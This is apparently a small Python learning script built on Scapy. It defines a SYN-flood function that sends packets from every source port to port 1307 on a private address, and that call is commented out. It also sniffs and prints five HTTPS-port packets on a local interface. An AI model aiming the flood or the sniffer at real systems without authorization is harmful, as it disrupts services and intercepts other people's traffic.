from scapy.all import *
import os
def synFlood(src,dst):
    for sport in range(1024,65535):
        L3 = IP(src=src, dst=dst)
        L4 = TCP(sport=sport, dport=1307)
        pkt = L3/L4
        send(pkt)

src = "192.168.43.178"
dst = "192.168.43.178"

#synFlood(src,dst);


def sniffer():
    pkts = sniff(iface="en0", count=5 ,filter="port https")
    for pkt in pkts:
        pkt.show()

sniffer()